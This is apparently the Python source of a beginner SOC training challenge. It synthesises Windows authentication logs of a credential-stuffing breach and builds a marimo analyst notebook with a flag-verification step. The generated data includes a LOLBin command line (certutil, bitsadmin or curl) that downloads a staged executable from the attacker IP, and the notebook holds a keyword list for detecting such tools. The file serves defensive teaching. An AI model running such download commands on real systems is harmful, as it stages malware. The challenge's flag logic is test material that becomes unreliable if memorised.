"""Human-crafted SOC Authentication Triage Template (Flagship Module 1)."""

from pathlib import Path
from typing import Dict, Any, List, Optional
import datetime
import hashlib
import json
import random

from app.modules.digital_governance.services.templates.base_template import BaseChallengeTemplate


class SocAuthTemplate(BaseChallengeTemplate):
    """
    Template for Off-Hours Authentication Triage & Credential Stuffing Analysis.
    Generates synthetic Windows event telemetry (Events 4624, 4625, 4688) with
    dynamic attacker IPs, compromised usernames, timestamps, and flags.
    """

    template_id = "soc-auth-investigation"
    title = "SOC Incident: Authentication Triage & Credential Stuffing"
    category = "SOC Investigation"
    difficulty = "Beginner"
    base_points = 100
    duration_minutes = 45
    competency_id = "soc_investigation"
    competency_weight = 1.0
    tags = ["soc", "authentication", "brute-force", "event-4625", "event-4624", "lolbin", "certutil", "cybersecurity", "cert-in"]
    mitre_techniques = ["T1110.001", "T1078.002", "T1105"]

    CODENAMES = [
        "Operation NightShift",
        "Operation VajraShield",
        "Operation IronRaven",
        "Operation ShadowGate",
        "Operation DarkCascade",
        "Operation FrostBite",
        "Operation CyberVault",
    ]

    TARGET_ACCOUNTS = [
        "admin_finance",
        "svc_backup",
        "fin_director",
        "secops_lead",
        "payroll_admin",
        "treasury_nodal",
        "corp_executive",
    ]

    TARGET_HOSTS = [
        ("PAYROLL-SRV01", "10.0.4.50"),
        ("FINANCE-DC01", "10.0.4.10"),
        ("TREASURY-GW02", "10.0.4.99"),
        ("HR-ERP-SRV", "10.0.4.75"),
    ]

    LOLBIN_TOOLS = [
        ("certutil.exe", "-urlcache -split -f"),
        ("bitsadmin.exe", "/transfer job /download /priority high"),
        ("curl.exe", "-s -O"),
    ]

    def get_slot_schema(self) -> Dict[str, Dict[str, Any]]:
        return {
            "incident_codename": {"type": "str", "description": "Investigation operation codename"},
            "attacker_ip": {"type": "str", "description": "External brute-force source IP"},
            "victim_user": {"type": "str", "description": "Compromised administrative account"},
            "target_host": {"type": "str", "description": "Target server hostname"},
            "target_internal_ip": {"type": "str", "description": "Target server internal IP"},
            "brute_attempts": {"type": "int", "description": "Number of failed password attempts"},
            "lolbin_tool": {"type": "str", "description": "Living-off-the-land download binary"},
            "lolbin_args": {"type": "str", "description": "Arguments supplied to lolbin tool"},
            "staged_binary": {"type": "str", "description": "Name of dropped staging payload"},
            "breach_offset_min": {"type": "int", "description": "Minutes into off-hours when breach occurred"},
        }

    def generate_random_slots(
        self, seed: Optional[str] = None, overrides: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        rng = random.Random(seed) if seed else random.Random()

        host, internal_ip = rng.choice(self.TARGET_HOSTS)
        lolbin, lolbin_args = rng.choice(self.LOLBIN_TOOLS)

        slots = {
            "incident_codename": rng.choice(self.CODENAMES),
            "attacker_ip": f"{rng.randint(45, 198)}.{rng.randint(10, 250)}.{rng.randint(1, 254)}.{rng.randint(2, 250)}",
            "victim_user": rng.choice(self.TARGET_ACCOUNTS),
            "target_host": host,
            "target_internal_ip": internal_ip,
            "brute_attempts": rng.randint(45, 95),
            "lolbin_tool": lolbin,
            "lolbin_args": lolbin_args,
            "staged_binary": f"update_{rng.randint(1000, 9999)}.exe",
            "breach_offset_min": rng.randint(15, 55),
            "seed_hash": hashlib.md5(f"{seed}-{rng.random()}".encode()).hexdigest(),
        }

        if overrides:
            slots.update(overrides)

        return slots

    def compute_flag(self, slots: Dict[str, Any]) -> str:
        raw = f"{slots['victim_user']}_{slots['lolbin_tool'].split('.')[0]}_{slots['seed_hash'][:6]}"
        return f"FLAG{{{raw.lower()}}}"

    def generate_hints(self, slots: Dict[str, Any]) -> List[Dict[str, Any]]:
        return [
            {
                "id": 1,
                "content": "Filter authentication events where event_id is 4625 (logon failure) and group by source_ip to discover the anomalous brute force origin.",
                "penalty": 15,
            },
            {
                "id": 2,
                "content": f"Once you locate the attacker IP, filter for the subsequent successful logon (Event 4624) on target {slots['target_host']}. The post-exploitation command line (Event 4688) contains the flag.",
                "penalty": 25,
            },
        ]

    def generate_objectives(self, slots: Dict[str, Any]) -> List[str]:
        return [
            f"Isolate anomalous external logon failures targeting internal workstation {slots['target_host']}.",
            f"Identify the compromised privileged account ('{slots['victim_user']}') that succeeded during off-hours.",
            f"Analyze subsequent Process Creation (Event 4688) invoking {slots['lolbin_tool']} to extract the incident flag.",
        ]

    def generate_scenario_description(self, slots: Dict[str, Any]) -> str:
        return f"""### Emergency Incident Briefing: {slots['incident_codename']}

**Classified / CERT-In Referral Notice**
At 02:15 IST, the Security Operations Center (SOC) automated monitoring system raised a high-severity alert for off-hours authentication anomalies on high-value asset `{slots['target_host']}` (`{slots['target_internal_ip']}`).

The telemetry stream contains raw Windows Security Event logs spanning legitimate administrative activity alongside a coordinated credential-stuffing assault.

Your mandate as Incident Response Lead:
1. Examine `auth_events.json` using the interactive Marimo analyst notebook.
2. Uncover the adversary's originating public IP and logon failure patterns.
3. Determine the compromised account and analyze the post-authentication Living-off-the-Land command line to recover the incident flag.
"""

    def synthesize_artifacts(
        self, slots: Dict[str, Any], output_dir: Path
    ) -> Dict[str, Path]:
        data_dir = output_dir / "data"
        data_dir.mkdir(parents=True, exist_ok=True)

        events: List[Dict[str, Any]] = []
        base_time = datetime.datetime(2026, 9, 12, 1, 0, 0, tzinfo=datetime.timezone.utc)

        legit_users = ["backup_service", "admin_sync", "operator1", "operator2", "healthcheck"]
        legit_ips = ["10.0.1.15", "10.0.1.20", "10.0.2.5", "192.168.1.100"]

        # 1. Generate 120 baseline legitimate events
        for i in range(120):
            ts = base_time + datetime.timedelta(seconds=i * 45)
            status = "SUCCESS" if (i % 8 != 0) else "FAILURE"
            events.append({
                "timestamp": ts.strftime("%Y-%m-%d %H:%M:%S+00:00"),
                "event_id": 4624 if status == "SUCCESS" else 4625,
                "source_ip": random.choice(legit_ips),
                "target_user": random.choice(legit_users),
                "workstation": slots["target_host"],
                "status": status,
                "auth_package": "Kerberos",
                "process_name": "C:\\Windows\\System32\\lsass.exe",
            })

        # 2. Coordinated brute force spray from attacker IP
        attacker_ip = slots["attacker_ip"]
        victim_user = slots["victim_user"]
        workstation = slots["target_host"]
        flag = self.compute_flag(slots)

        spray_start = base_time + datetime.timedelta(minutes=slots["breach_offset_min"])
        brute_count = slots["brute_attempts"]

        for j in range(brute_count):
            t_event = spray_start + datetime.timedelta(seconds=j * 2)
            events.append({
                "timestamp": t_event.strftime("%Y-%m-%d %H:%M:%S+00:00"),
                "event_id": 4625,
                "source_ip": attacker_ip,
                "target_user": victim_user if (j > brute_count - 5) else f"user_{j % 10}",
                "workstation": workstation,
                "status": "FAILURE",
                "auth_package": "NTLM",
                "process_name": "C:\\Windows\\System32\\lsass.exe",
            })

        # 3. Successful breach logon
        breach_time = spray_start + datetime.timedelta(seconds=brute_count * 2 + 5)
        events.append({
            "timestamp": breach_time.strftime("%Y-%m-%d %H:%M:%S+00:00"),
            "event_id": 4624,
            "source_ip": attacker_ip,
            "target_user": victim_user,
            "workstation": workstation,
            "status": "SUCCESS",
            "auth_package": "NTLM",
            "process_name": "C:\\Windows\\System32\\lsass.exe",
        })

        # 4. Living-off-the-Land post-exploitation command containing flag
        cmd_time = breach_time + datetime.timedelta(seconds=18)
        lolbin = slots.get("lolbin_tool", "certutil.exe")
        args = slots.get("lolbin_args", "-urlcache -split -f")
        staged = slots.get("staged_binary", "update_4821.exe")
        command_line = f"{lolbin} {args} http://{attacker_ip}/{staged} {flag}"

        events.append({
            "timestamp": cmd_time.strftime("%Y-%m-%d %H:%M:%S+00:00"),
            "event_id": 4688,
            "source_ip": attacker_ip,
            "target_user": victim_user,
            "workstation": workstation,
            "status": "SUCCESS",
            "auth_package": "COMMAND",
            "process_name": f"C:\\Windows\\System32\\{lolbin}",
            "command_line": command_line,
        })

        # Sort chronologically
        events.sort(key=lambda x: x["timestamp"])

        data_file = data_dir / "auth_events.json"
        with open(data_file, "w") as f:
            json.dump(events, f, indent=2)

        return {"auth_events.json": data_file}

    def generate_notebook(self, slots: Dict[str, Any], output_dir: Path) -> Path:
        marimo_dir = output_dir / "marimo"
        marimo_dir.mkdir(parents=True, exist_ok=True)
        target_nb = marimo_dir / "challenge.py"

        flag = self.compute_flag(slots)
        dynamic_hash = hashlib.sha256(flag.encode()).hexdigest()

        code = _NOTEBOOK_TEMPLATE
        code = code.replace("__APP_TITLE__", f"SOC Incident: {slots.get('incident_codename', 'Operation NightShift')}")
        code = code.replace("__INCIDENT_CODENAME__", slots.get('incident_codename', 'Operation NightShift'))
        code = code.replace("__TARGET_HOST__", slots.get('target_host', 'PAYROLL-SRV01'))
        code = code.replace("__TARGET_INTERNAL_IP__", slots.get('target_internal_ip', '10.0.4.50'))
        code = code.replace("__ATTACKER_IP__", slots.get('attacker_ip', '198.51.100.42'))
        code = code.replace("__VICTIM_USER__", slots.get('victim_user', 'admin_finance'))
        code = code.replace("__LOLBIN_TOOL__", slots.get('lolbin_tool', 'certutil.exe'))
        code = code.replace("__LOLBIN_ARGS__", slots.get('lolbin_args', '-urlcache -split -f'))
        code = code.replace("__STAGED_BINARY__", slots.get('staged_binary', 'update_4821.exe'))
        code = code.replace("__TARGET_HASH__", dynamic_hash)

        target_nb.write_text(code, encoding="utf-8")
        return target_nb


_NOTEBOOK_TEMPLATE = r'''import marimo

__generated_with = "0.24.1"
app = marimo.App(width="full", app_title="__APP_TITLE__")


@app.cell(hide_code=True)
def __():
    import hashlib
    import json
    import re
    from pathlib import Path
    import marimo as mo
    import pandas as pd

    return Path, hashlib, json, mo, pd, re


@app.cell(hide_code=True)
def __(Path, json, pd):
    # Locate dataset across local sandbox, repository root, and container environments
    possible_paths = [
        Path("data/auth_events.json"),
        Path("../data/auth_events.json"),
        Path("/workspace/data/auth_events.json"),
        Path("challenges/01-soc-auth-investigation/data/auth_events.json"),
    ]
    if "__file__" in globals():
        possible_paths.insert(
            0, Path(__file__).resolve().parent.parent / "data" / "auth_events.json"
        )

    data_file = next((p for p in possible_paths if p.exists()), None)

    if data_file:
        with open(data_file) as f:
            raw_data = json.load(f)
        df = pd.DataFrame(raw_data)
        df["timestamp"] = pd.to_datetime(df["timestamp"])
    else:
        df = pd.DataFrame()

    total_events = len(df)
    failed_events = (
        len(df[df["status"] == "FAILURE"])
        if not df.empty and "status" in df.columns
        else 0
    )
    success_events = (
        len(df[df["status"] == "SUCCESS"])
        if not df.empty and "status" in df.columns
        else 0
    )
    unique_ips = (
        df["source_ip"].nunique() if not df.empty and "source_ip" in df.columns else 0
    )

    return (
        data_file,
        df,
        failed_events,
        raw_data,
        success_events,
        total_events,
        unique_ips,
    )


@app.cell(hide_code=True)
def __(mo):
    # Analyst Sidebar: Incident Context, MITRE Mapping & Checklist
    check_ip = mo.ui.checkbox(
        label="1. Identify brute-forcing external IP", value=False
    )
    check_user = mo.ui.checkbox(label="2. Uncover breached username", value=False)
    check_breach = mo.ui.checkbox(
        label="3. Determine interactive breach timestamp", value=False
    )
    check_proc = mo.ui.checkbox(
        label="4. Spot malicious LOLBin process execution", value=False
    )
    check_flag = mo.ui.checkbox(label="5. Extract containment flag", value=False)

    hint_status = mo.callout(
        mo.md(
            "🔒 **Investigation Hints Locked**\n\n"
            "Hints are locked behind the CyberLab CTFd portal to ensure competitive integrity. Unlock hints in the left portal panel (deducts points from final solve)."
        ),
        kind="info",
    )

    sidebar_content = mo.vstack(
        [
            mo.md("## 🛡️ CyberLab SOC Console"),
            mo.md("**Incident ID**: `__INCIDENT_CODENAME__`"),
            mo.md("**Target Host**: `__TARGET_HOST__` (Windows Server 2022)"),
            mo.md("**Classification**: `TLP:AMBER` | Severity: **HIGH**"),
            mo.md("---"),
            mo.md("### 🎯 Investigation Checklist"),
            check_ip,
            check_user,
            check_breach,
            check_proc,
            check_flag,
            mo.md("---"),
            mo.md("### 🗺️ MITRE ATT&CK Matrix"),
            mo.md(
                "- **T1110.001**: Password Guessing (Brute Force)\n- **T1078.002**: Domain Accounts\n- **T1105**: Ingress Tool Transfer (`certutil`)"
            ),
            mo.md("---"),
            hint_status,
        ]
    )

    mo.sidebar(sidebar_content)
    return (
        check_breach,
        check_flag,
        check_ip,
        check_proc,
        check_user,
        hint_status,
        sidebar_content,
    )


@app.cell(hide_code=True)
def __(failed_events, mo, success_events, total_events, unique_ips):
    # Tab 1: Alert Triage & Scope View
    triage_view = mo.vstack(
        [
            mo.md("""
            # 🛡️ SOC Incident: __INCIDENT_CODENAME__
            ### Off-Hours Authentication Triage & Credential Stuffing Analysis
            """),
            mo.callout(
                mo.md(
                    "**SOC Alert Notice**: At 03:14 UTC, SIEM triggered a high-severity alert for abnormal authentication failures targeting `__TARGET_HOST__`, followed by privileged logon activity. Your mission as Tier-1/2 SOC Analyst is to scope the campaign, identify the compromised account, trace attacker post-exploitation commands, and retrieve the containment flag."
                ),
                kind="warn",
            ),
            mo.hstack(
                [
                    mo.stat(
                        value=f"{total_events:,}",
                        label="Total Events Audited",
                        caption="Ingested Event Log Window",
                        bordered=True,
                    ),
                    mo.stat(
                        value=f"{failed_events:,}",
                        label="Authentication Failures",
                        caption="Event ID 4625 (Logon Failure)",
                        direction="increase",
                        bordered=True,
                    ),
                    mo.stat(
                        value=f"{success_events:,}",
                        label="Successful Logons",
                        caption="Event ID 4624 (Logon Success)",
                        bordered=True,
                    ),
                    mo.stat(
                        value=f"{unique_ips}",
                        label="Distinct Source IPs",
                        caption="Internal LAN & External WAN",
                        bordered=True,
                    ),
                ],
                justify="start",
                gap=1,
            ),
            mo.md("""
            ### 🖥️ Target Host Profile:
            | Asset Name | IP Address | Operating System | Criticality | Role |
            | :--- | :--- | :--- | :--- | :--- |
            | `__TARGET_HOST__` | `__TARGET_INTERNAL_IP__` | Windows Server 2022 Datacenter | **Tier 0 (Crown Jewel)** | Finance & Compensation Master |

            ### 🎯 Analyst Investigation Objectives:
            1. **Reconnaissance & Brute Force**: Which external IP generated hundreds of failed authentication attempts?
            2. **Account Breach**: Which internal domain account was breached?
            3. **Timeline**: At what exact timestamp did the attacker transition from failed password guesses to an interactive logon?
            4. **Post-Exploitation & Staging**: What Living-off-the-Land tool (`__LOLBIN_TOOL__`) was executed, and what flag is embedded in the command parameters?
            """),
        ]
    )
    return (triage_view,)


@app.cell(hide_code=True)
def __(mo):
    # Tab 2: Raw Telemetry Explorer Controls
    status_filter = mo.ui.dropdown(
        options=["ALL", "FAILURE", "SUCCESS"],
        value="ALL",
        label="Logon Status:",
    )
    user_search = mo.ui.text(
        placeholder="Filter username (e.g., admin)...",
        label="Target User:",
    )
    ip_search = mo.ui.text(
        placeholder="Filter IP (e.g., 198.51.100.42)...",
        label="Source IP:",
    )
    return ip_search, status_filter, user_search


@app.cell(hide_code=True)
def __(df, ip_search, mo, status_filter, user_search):
    # Tab 2: Filtered Telemetry Explorer View & Export
    filtered = df.copy() if not df.empty else df
    if not filtered.empty:
        if status_filter.value != "ALL":
            filtered = filtered[filtered["status"] == status_filter.value]
        if user_search.value.strip():
            filtered = filtered[
                filtered["target_user"].str.contains(
                    user_search.value.strip(), case=False, na=False
                )
            ]
        if ip_search.value.strip():
            filtered = filtered[
                filtered["source_ip"].str.contains(
                    ip_search.value.strip(), case=False, na=False
                )
            ]

    raw_table = mo.ui.table(
        (
            filtered[
                [
                    "timestamp",
                    "event_id",
                    "source_ip",
                    "target_user",
                    "workstation",
                    "status",
                    "auth_package",
                    "process_name",
                ]
            ]
            if not filtered.empty and "event_id" in filtered.columns
            else filtered
        ),
        selection=None,
        pagination=True,
        page_size=12,
        show_column_summaries=False,
    )

    export_json = (
        filtered.to_json(orient="records", date_format="iso", indent=2).encode("utf-8")
        if not filtered.empty
        else b"[]"
    )
    download_btn = mo.download(
        data=export_json,
        filename="filtered_auth_telemetry.json",
        label="📥 Export Filtered Telemetry (JSON)",
    )

    telemetry_view = mo.vstack(
        [
            mo.md("## 🔍 Security Event Log Telemetry"),
            mo.md(
                "Filter and inspect the authentication event stream across the ingested events. You can also export filtered subsets for offline analysis:"
            ),
            mo.hstack([status_filter, user_search, ip_search, download_btn], gap=1),
            raw_table,
        ]
    )
    return download_btn, export_json, filtered, raw_table, telemetry_view


@app.cell(hide_code=True)
def __(mo):
    # Tab 3: Analyst Live Python Code Editor
    scratchpad = mo.ui.code_editor(
        value=(
            "# 💻 Analyst Python Scratchpad\n"
            "# Variables in scope: `df` (DataFrame), `pd` (pandas)\n"
            "# Example 1: Group failures by source IP to spot brute-force attacker\n"
            "failures = df[df['status'] == 'FAILURE']\n"
            "top_failures = failures.groupby('source_ip').size().reset_index(name='fail_count')\n"
            "top_failures.sort_values(by='fail_count', ascending=False).head(10)"
        ),
        language="python",
        label="Python Security Analytics Console:",
    )
    return (scratchpad,)


@app.cell(hide_code=True)
def __(df, mo, pd, scratchpad):
    # Tab 3: Reactive Python Execution Engine
    code_text = scratchpad.value.strip()
    eval_result = None

    if code_text:
        locs = {"df": df, "pd": pd}
        try:
            lines = [
                l
                for l in code_text.splitlines()
                if l.strip() and not l.strip().startswith("#")
            ]
            if lines:
                exec_chunk = "\n".join(lines[:-1])
                last_line = lines[-1]
                if exec_chunk:
                    exec(exec_chunk, {"__builtins__": __builtins__}, locs)
                try:
                    res = eval(last_line, {"__builtins__": __builtins__}, locs)
                except SyntaxError:
                    exec(last_line, {"__builtins__": __builtins__}, locs)
                    res = locs.get("output", locs.get("result", "Script executed."))

                if isinstance(res, pd.DataFrame):
                    eval_result = mo.ui.table(
                        res,
                        selection=None,
                        pagination=True,
                        page_size=8,
                        show_column_summaries=False,
                    )
                elif isinstance(res, (pd.Series, dict, list)):
                    eval_result = mo.json(res)
                else:
                    eval_result = mo.md(f"```text\n{res}\n```")
        except Exception as err:
            eval_result = mo.callout(
                mo.md(f"**Console Execution Error**: `{err}`"), kind="danger"
            )
    else:
        eval_result = mo.md("*Type code above to execute queries on `df`.*")

    scratchpad_view = mo.vstack(
        [
            mo.md("## 💻 Analyst Python Scratchpad Console"),
            mo.md(
                "Real SOC and DFIR analysts write ad-hoc Python snippets to slice logs and compute statistics. Use the live scratchpad below to analyze `df`:"
            ),
            scratchpad,
            mo.md("#### 📊 Reactive Execution Output:"),
            eval_result,
            mo.accordion(
                {
                    "📖 Helpful SOC Queries to Try": mo.md(
                        "**1. Time Delta Between Last Failure & First Success**:\n"
                        "```python\n"
                        "succ = df[(df['source_ip']=='__ATTACKER_IP__') & (df['status']=='SUCCESS')]['timestamp'].min()\n"
                        "fail = df[(df['source_ip']=='__ATTACKER_IP__') & (df['status']=='FAILURE')]['timestamp'].max()\n"
                        "f'Transition delay: {succ - fail}'\n"
                        "```\n\n"
                        "**2. Attacker Executed Command Lines**:\n"
                        "```python\n"
                        "df[df['command_line'].notna()][['timestamp', 'target_user', 'command_line']]\n"
                        "```"
                    )
                }
            ),
        ]
    )
    return code_text, eval_result, locs, scratchpad_view


@app.cell(hide_code=True)
def __(mo):
    # Tab 4: Anomaly Threshold Slider Control with Editable Input Box
    min_fail_slider = mo.ui.slider(
        start=1,
        stop=260,
        step=5,
        value=20,
        show_value=True,
        include_input=True,
        label="Min Failed Logons Threshold:",
    )
    return (min_fail_slider,)


@app.cell(hide_code=True)
def __(df, min_fail_slider, mo):
    # Tab 4: Anomaly Table & Source IP Selector
    if not df.empty and "status" in df.columns:
        failures = df[df["status"] == "FAILURE"]
        fail_summary = (
            failures.groupby("source_ip")
            .agg(
                failed_attempts=("event_id", "count"),
                targeted_users=("target_user", lambda x: list(set(x))[:6]),
                first_attempt=("timestamp", "min"),
                last_attempt=("timestamp", "max"),
            )
            .reset_index()
            .sort_values(by="failed_attempts", ascending=False)
        )
        fail_summary = fail_summary[
            fail_summary["failed_attempts"] >= min_fail_slider.value
        ]
        anomaly_table = mo.ui.table(
            fail_summary,
            selection=None,
            pagination=True,
            page_size=6,
            show_column_summaries=False,
        )
    else:
        fail_summary = df
        anomaly_table = mo.md("No failure records found.")

    ip_choices = (
        list(fail_summary["source_ip"].unique())
        if not fail_summary.empty and "source_ip" in fail_summary.columns
        else []
    )
    timeline_ip_select = mo.ui.dropdown(
        options=ip_choices,
        value=ip_choices[0] if ip_choices else None,
        label="Select Source IP to Trace Chronological Activity:",
    )
    return anomaly_table, fail_summary, failures, ip_choices, timeline_ip_select


@app.cell(hide_code=True)
def __(anomaly_table, df, min_fail_slider, mo, timeline_ip_select):
    # Tab 4: Chronological Attack Timeline & LOLBin Forensics View
    selected_ip = timeline_ip_select.value
    if selected_ip and not df.empty:
        ip_events = df[df["source_ip"] == selected_ip].sort_values("timestamp")
        successful_logins = ip_events[ip_events["status"] == "SUCCESS"]

        if not successful_logins.empty:
            first_succ = successful_logins.iloc[0]
            breach_alert = mo.callout(
                mo.md(
                    f"🚨 **BREACH CONFIRMED**: Source IP `{selected_ip}` achieved **{len(successful_logins)} successful logon(s)** after repeated failures!\n\n"
                    f"- **Compromised Account**: `{first_succ['target_user']}`\n"
                    f"- **Breach Timestamp**: `{first_succ['timestamp']}`\n"
                    f"- **Logon Event ID**: `{first_succ['event_id']}` (Logon Success)"
                ),
                kind="danger",
            )
        else:
            breach_alert = mo.callout(
                mo.md(
                    f"No successful logons detected for `{selected_ip}` in this timeframe."
                ),
                kind="info",
            )

        timeline_table = mo.ui.table(
            ip_events[
                [
                    "timestamp",
                    "event_id",
                    "target_user",
                    "status",
                    "process_name",
                    "command_line",
                ]
            ],
            selection=None,
            pagination=True,
            page_size=8,
            show_column_summaries=False,
        )
    else:
        breach_alert = mo.md("")
        timeline_table = mo.md(
            "Select an IP address above to display its chronological activity."
        )

    # LOLBin tool execution
    cmd_cards = []
    if not df.empty and "command_line" in df.columns:
        cmd_events = df[
            df["command_line"].notna() & (df["command_line"] != "")
        ].sort_values("timestamp")
        for _, row in cmd_events.iterrows():
            is_suspicious = (
                "certutil" in str(row["command_line"]).lower()
                or "bitsadmin" in str(row["command_line"]).lower()
                or "curl" in str(row["command_line"]).lower()
                or "whoami" in str(row["command_line"]).lower()
            )
            badge = "🚨 ATTACKER LOLBIN" if is_suspicious else "ℹ️ NORMAL"
            cmd_cards.append(
                f"### {badge}: `{row['process_name']}`\n"
                f"- **Timestamp**: `{row['timestamp']}`\n"
                f"- **Account Context**: `{row['target_user']}`\n"
                f"- **Workstation**: `{row['workstation']}`\n"
                f"- **Executed Command Line**:\n"
                f"```bat\n{row['command_line']}\n```"
            )
        cmd_display = (
            mo.md("\n\n---\n\n".join(cmd_cards))
            if cmd_cards
            else mo.md("No command line telemetry recorded.")
        )
    else:
        cmd_display = mo.md("No command line events recorded.")

    timeline_view = mo.vstack(
        [
            mo.md("## ⚡ High-Frequency Failure Triage & Attack Timeline"),
            mo.md("Filter by failure threshold to isolate the attack source:"),
            min_fail_slider,
            anomaly_table,
            mo.md("---"),
            mo.md("### 🕵️ Chronological Session Activity:"),
            timeline_ip_select,
            breach_alert,
            timeline_table,
            mo.md("---"),
            mo.md("### 📦 Living-off-the-Land (LOLBin) Tool Retrieval Forensics:"),
            cmd_display,
        ]
    )
    return (
        breach_alert,
        cmd_cards,
        cmd_display,
        cmd_events,
        ip_events,
        selected_ip,
        successful_logins,
        timeline_table,
        timeline_view,
    )


@app.cell(hide_code=True)
def __(mo):
    # Tab 5: Flag Input Control
    candidate_flag = mo.ui.text(
        placeholder="FLAG{...}",
        label="Enter Extracted Flag to Verify:",
    )
    return (candidate_flag,)


@app.cell(hide_code=True)
def __(candidate_flag, hashlib, mo, re):
    # Tab 5: Anti-Cheat SHA-256 Verification & IOC Report Unlock
    val = candidate_flag.value.strip()
    target_hash = "__TARGET_HASH__"

    if not val:
        flag_feedback = mo.md(
            "Enter the flag discovered in the attacker's executed commands."
        )
        ioc_view = mo.md(
            "🔒 *Threat Intelligence & IOC Report locked until valid incident flag is verified.*"
        )
    elif hashlib.sha256(val.encode()).hexdigest() == target_hash:
        flag_feedback = mo.callout(
            mo.md(
                "🎉 **FLAG VERIFIED CORRECT!**\n\n"
                "Your recovered containment flag is verified! Now submit this flag in the **Submit Flag** box in the left CyberLab portal pane to register your 100 points and SOC competency!"
            ),
            kind="success",
        )
        ioc_view = mo.vstack(
            [
                mo.md(
                    "### 📋 Confirmed Threat Intelligence Indicators of Compromise (IOCs):"
                ),
                mo.md("""
                | Indicator Type | Value | Threat Context |
                | :--- | :--- | :--- |
                | **Attacker IPv4** | `__ATTACKER_IP__` | Brute-force password spray origin |
                | **Compromised Account** | `__VICTIM_USER__` | Domain administrative credential breached |
                | **LOLBin Tool Retrieval** | `__LOLBIN_TOOL__ __LOLBIN_ARGS__` | Staged ingress download of `__STAGED_BINARY__` |
                | **Breach Target** | `__TARGET_HOST__` (`__TARGET_INTERNAL_IP__`) | Interactive NTLM logon verified |
                """),
            ]
        )
    elif re.match(r"^FLAG\{.*\}$", val):
        flag_feedback = mo.callout(
            mo.md(
                "❌ Incorrect flag. Inspect the arguments passed to `__LOLBIN_TOOL__` in the Attack Timeline tab."
            ),
            kind="danger",
        )
        ioc_view = mo.md(
            "🔒 *Threat Intelligence & IOC Report locked until valid incident flag is verified.*"
        )
    else:
        flag_feedback = mo.callout(
            mo.md(
                "⚠️ Flag format invalid. Flags must begin with `FLAG{` and end with `}`."
            ),
            kind="warn",
        )
        ioc_view = mo.md(
            "🔒 *Threat Intelligence & IOC Report locked until valid incident flag is verified.*"
        )

    verification_view = mo.vstack(
        [
            mo.md("## 🏁 Incident Verification & Threat Intelligence Report"),
            mo.callout(
                mo.md(
                    "Once you have identified the attacker's staging command line, extract the embedded flag and verify it below to unlock the verified IOC documentation:"
                ),
                kind="info",
            ),
            candidate_flag,
            flag_feedback,
            mo.md("---"),
            ioc_view,
        ]
    )
    return flag_feedback, ioc_view, target_hash, val, verification_view


@app.cell
def console_root(
    mo,
    scratchpad_view,
    telemetry_view,
    timeline_view,
    triage_view,
    verification_view,
):
    # Pure CyberLab Console Styles & Overrides
    styles = mo.Html("""
    <style>
    /* 1. Eliminate Irrelevant Developer Tools */
    [data-testid="chrome-sidebar"],
    #app-chrome-sidebar,
    #app-chrome-panel,
    .resize-handle {
        display: none !important;
    }

    /* 2. Eliminate Cell Handles & Authoring Overlays */
    [data-testid="drag-button"],
    [data-testid="cell-actions-button"],
    [data-testid="create-cell-button"],
    [data-testid="run-button"],
    [data-testid="hide-code-button"],
    [data-testid="fullscreen-output-button"],
    [data-testid="expand-output-button"],
    .hover-actions-parent > .hover-action,
    .shoulder-right,
    .cell-actions,
    .cell-actions-button,
    .cell-bottom-menu,
    .add-cell-button {
        display: none !important;
    }

    /* 3. Eliminate Marimo Authoring Header & Footers */
    [data-testid="filename-input"],
    [data-testid="chrome-controls-top-right"],
    [data-testid="chrome-controls-bottom-right"],
    [data-testid="chrome-footer"],
    [data-testid="footer-panel"] {
        display: none !important;
    }

    /* 4. Hide all backend/setup cells above the Console */
    .marimo-cell:not(:has(.cyberlab-topbar)) {
        display: none !important;
    }

    /* 5. Hide code editors in all cells (show only outputs) */
    .marimo-cell .cm-editor,
    .marimo-cell .cm-scroller,
    .marimo-cell .cell-editor,
    [data-testid="cell-editor"] {
        display: none !important;
        height: 0 !important;
        overflow: hidden !important;
    }

    /* 6. Fullscreen / Maximized Console Layout */
    .marimo-cell:has(.cyberlab-topbar) {
        width: 100% !important;
        max-width: 100% !important;
        margin: 0 !important;
        padding: 0 4px !important;
    }

    #App, main, #app-chrome-body, [data-testid="column-container"] {
        max-width: 100% !important;
        padding: 0 !important;
        margin: 0 !important;
    }

    .cyberlab-topbar {
        display: flex;
        align-items: center;
        justify-content: space-between;
        background: #0f172a;
        border: 1px solid #1e293b;
        border-radius: 8px;
        padding: 10px 16px;
        margin-bottom: 10px;
    }
    .cyberlab-topbar .title {
        font-size: 13px;
        font-weight: 700;
        color: #e2e8f0;
        display: flex;
        align-items: center;
        gap: 10px;
    }
    .cyberlab-topbar .live-badge {
        background: #dc2626;
        color: white;
        font-size: 10px;
        font-weight: 800;
        padding: 2px 7px;
        border-radius: 4px;
        letter-spacing: 0.5px;
    }
    .cyberlab-topbar .fullscreen-btn {
        background: #1e293b;
        color: #38bdf8;
        border: 1px solid #334155;
        padding: 6px 14px;
        border-radius: 6px;
        cursor: pointer;
        font-size: 12px;
        font-weight: 600;
        display: flex;
        align-items: center;
        gap: 6px;
        transition: all 0.2s;
    }
    .cyberlab-topbar .fullscreen-btn:hover {
        background: #0284c7;
        color: #ffffff;
        border-color: #0284c7;
    }
    </style>
    """)

    # Invisible anchor div keeps the .cyberlab-topbar CSS selector working
    header = mo.Html(
        '<div class="cyberlab-topbar" style="display:none !important; height:0; margin:0; padding:0; border:none;"></div>'
    )

    # Top-Level Analyst Operations Console
    console = mo.ui.tabs(
        {
            "📋 Alert Triage & Scope": triage_view,
            "🔍 Telemetry Explorer": telemetry_view,
            "💻 Analyst Python Scratchpad": scratchpad_view,
            "⚡ Attack Timeline & Pivot": timeline_view,
            "🏁 Case Verification & IOCs": verification_view,
        }
    )
    workspace = mo.vstack([styles, header, console])
    workspace
    return console, header, styles, workspace


if __name__ == "__main__":
    app.run()
'''
